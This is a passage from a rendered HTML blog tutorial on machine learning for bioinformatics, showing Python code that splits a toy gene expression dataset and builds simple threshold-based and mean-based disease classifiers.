punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> y</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">df</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">'Label_name'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> df</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">'Label'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">map</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'Normal'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'Disease'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"Gene Expression Data Sample:"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">df</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">head</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">10</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"\nDataset shape: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">X</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">shape</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> patients, </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">X</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">shape</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> genes"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Classes: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation builtin" style="color:hsl(119, 34%, 47%)">int</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation">y</span><span class="token string-interpolation interpolation operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> Normal, </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation builtin" style="color:hsl(119, 34%, 47%)">int</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation">y</span><span class="token string-interpolation interpolation operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> Disease"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Split data: 80% train, 20% test</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">split_idx </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">80</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">X_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X_test </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">split_idx</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">split_idx</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_test </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> y</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">split_idx</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">split_idx</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"\nTraining set: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">X_train</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">shape</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> samples"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Test set: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">X_test</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">shape</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> samples"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Output:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Gene Expression Data Sample:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   Gene_A  Gene_B  Gene_C Label Label_name</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">0    4.86    7.02    4.23      0     Normal</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">1    5.12    3.54    5.67      0     Normal</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">2    3.45    4.89    6.12      0     Normal</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">...</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Dataset shape: 100 patients, 3 genes</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Classes: 50 Normal, 50 Disease</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Training set: 80 samples</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Test set: 20 samples</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="model-1-rule-based-classifier-simplest-possible">Model 1: Rule-Based Classifier (Simplest Possible)<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#model-1-rule-based-classifier-simplest-possible" class="hash-link" aria-label="Direct link to Model 1: Rule-Based Classifier (Simplest Possible)" title="Direct link to Model 1: Rule-Based Classifier (Simplest Possible)" translate="no">​</a></h3>
<p>The simplest classifier is just a rule based on one gene:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">class</span><span class="token plain"> </span><span class="token class-name" style="color:hsl(35, 99%, 36%)">SimpleRuleClassifier</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Classify patients based on a simple threshold rule.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    If Gene_A &gt; threshold: predict disease</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Else: predict normal</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    This is how a biologist might manually classify before ML!</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">__init__</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> gene_index</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> threshold</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">6.5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">gene_index </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> gene_index</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">threshold </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> threshold</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">gene_name </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> gene_names</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">gene_index</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">predict</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Make predictions based on simple rule."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        predictions </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">gene_index</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">threshold</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">astype</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">int</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> predictions</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">__repr__</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Rule: If </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">self</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">gene_name</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> &gt; </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">self</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">threshold</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">, predict Disease"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create and test the rule-based model</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">model1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> SimpleRuleClassifier</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">gene_index</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> threshold</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">6.5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">y_pred1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> model1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">predict</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"\nModel 1: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">model1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Sample predictions: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">y_pred1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">10]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="model-2-multi-gene-mean-classifier">Model 2: Multi-Gene Mean Classifier<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#model-2-multi-gene-mean-classifier" class="hash-link" aria-label="Direct link to Model 2: Multi-Gene Mean Classifier" title="Direct link to Model 2: Multi-Gene Mean Classifier" translate="no">​</a></h3>
<p>Slightly better: use the average of all genes:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">class</span><span class="token plain"> </span><span class="token class-name" style="color:hsl(35, 99%, 36%)">MeanClassifier</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Classify based on mean expression across all genes.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    If mean(all genes) &gt; threshold: predict disease</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Else: predict normal</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    This combines information from multiple genes!</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">__init__</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> threshold</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">6.5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">threshold </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> threshold</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">predict</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Make predictions based on mean expression."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        mean_expression </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">mean</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">axis</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Average across genes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        predictions </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">mean_expression </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">threshold</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">astype</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">int</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> predictions</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Test mean-based model</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">model2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> MeanClassifier</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">threshold</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">6.5</span><span 